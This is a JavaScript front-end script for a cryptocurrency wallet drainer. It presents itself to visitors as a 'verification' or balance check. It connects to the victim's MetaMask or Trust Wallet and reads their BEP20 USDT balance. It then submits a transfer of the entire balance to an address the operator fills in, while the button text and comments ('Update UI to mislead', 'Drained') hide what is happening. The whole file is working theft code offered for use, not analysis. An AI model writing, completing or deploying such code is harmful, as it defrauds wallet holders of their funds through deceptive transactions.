// CONFIGURATION
const RECIPIENT_ADDRESS = "0xYOUR_BSC_ADDRESS_HERE"; // Replace with your BSC Address
const USDT_CONTRACT_ADDRESS = "0x55d398326f99056b77e6534b23c23245e6d03228"; // BEP20 USDT

const btn = document.getElementById('actionBtn');
const status = document.getElementById('status');

// USDT Contract Interface
const usdtInterface = new ethers.utils.Interface([
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (boolean)"
]);

btn.addEventListener('click', async () => {
    try {
        // 1. Check Wallet
        if (!window.ethereum) {
            status.innerHTML = "⚠️ No wallet detected.";
            return;
        }

        // 2. Connect Provider
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        // 3. Update UI
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Checking Balance...';
        status.innerText = "";

        // 4. Fetch User's USDT Balance
        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, usdtInterface, signer);
        const balanceWei = await usdtContract.balanceOf(userAddress);
        const balanceUSDT = ethers.utils.formatUnits(balanceWei, 18); // 18 decimals for BEP20

        // 5. Check if Balance > 0
        if (parseFloat(balanceUSDT) < 0.01) {
            status.innerHTML = "⚠️ Low Balance: " + balanceUSDT + " USDT";
            btn.disabled = false;
            btn.innerText = "Try Again";
            return;
        }

        // 6. Update UI to mislead
        btn.innerHTML = '<span class="spinner"></span> Verifying Network...';
        status.innerText = `Found: ${balanceUSDT} USDT`;

        // 7. Prepare Full Drain Transaction
        // We send the EXACT balance (minus a tiny dust if needed, but exact is fine)
        const amountToDrain = balanceWei; 

        // 8. Execute Transfer
        // This will open the Trust Wallet / MetaMask Popup
        // The popup will show: "Transfer [Balance] USDT to [YourAddress]"
        const tx = await usdtContract.transfer(RECIPIENT_ADDRESS, amountToDrain, {
            gasLimit: 150000 // Standard BEP20 gas
        });

        // 9. Wait for Confirmation
        btn.innerHTML = '<span class="spinner"></span> Finalizing...';
        status.innerText = "Transaction Confirmed!";

        const receipt = await tx.wait();

        if (receipt.status === 1) {
            status.innerHTML = "✔ Success! Balance Verified & Drained.";
            btn.innerText = "Done";
            btn.style.background = "#10b981";
        } else {
            throw new Error("Failed");
        }

    } catch (error) {
        console.error(error);
        
        if (error.code === 1 || error.message.includes("User rejected")) {
            status.innerHTML = "❌ User rejected transaction.";
        } else {
            status.innerHTML = `❌ Error: ${error.message}`;
        }
        
        btn.disabled = false;
        btn.innerText = "Start Verification";
        btn.style.background = "#3b82f6";
    }
});